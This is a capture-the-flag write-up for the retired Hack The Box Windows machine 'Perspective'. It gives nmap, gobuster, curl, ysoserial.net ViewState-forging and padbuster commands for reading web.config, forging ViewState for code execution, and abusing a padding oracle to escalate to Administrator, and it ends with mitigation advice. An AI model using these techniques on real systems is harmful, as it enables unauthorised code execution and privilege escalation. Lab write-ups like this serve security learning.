---
machine: Perspective
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, aspnet, viewstate, machinekey, padding-oracle]
---

# Perspective — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Uploading `.shtml` allows reading `web.config` and recovering the `machineKey`. Sign a malicious ViewState with it and execute code as `webuser`; a padding oracle in the password reset injects commands and reaches Administrator.

## Reconnaissance

```bash
nmap -Pn -sCV -p80,443,3389,5985 <IP>
gobuster dir -u http://perspective.htb -w /usr/share/wordlists/dirb/common.txt
# Upload .shtml to include web.config
curl -F "file=@read.shtml" http://perspective.htb/upload
# Signed ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<KEY>" --validationalg="SHA1" --validationkey="<KEY>"
# Padding oracle
padbuster http://perspective.htb/reset <TOKEN> 16 -cookies "session=<COOKIE>"
```

## Enumeration

- IIS with `.shtml` enabled and file upload.
- ASP.NET application with ViewState enabled and `machineKey` in `web.config`.
- Password reset token vulnerable to a padding oracle.

## Initial access

Upload a `.shtml` that includes `web.config` and obtain the validation and decryption keys. Generate a signed ViewState with `ysoserial.net` and send it to the vulnerable page to execute code as `webuser`.

## Privilege escalation

The reset token is encrypted with a recovered key and is vulnerable to a padding oracle: manipulate the ciphertext until it is valid and inject a command into the process running as Administrator.

## Evidence

- `web.config` read through the `.shtml`.
- Signed ViewState accepted by IIS.
- Padding oracle and execution as Administrator.

## Lessons learned

- `machineKey` turns ViewState into code execution.
- Encrypted tokens without authentication can be manipulated.
- A padding oracle can escalate from web user to administrator.

## Mitigation and detection

- Rotate `machineKey` and disable ViewState when unused.
- Use AES-GCM or signed tokens and validate before decrypting.
- Block `.shtml` and restrict file upload.

## References

- [0xdf — Perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html)
- [Microsoft — machineKey](https://learn.microsoft.com/en-us/iis/configuration/system.web/machinekey)
- [Hack The Box — Perspective](https://app.hackthebox.com/machines/perspective)
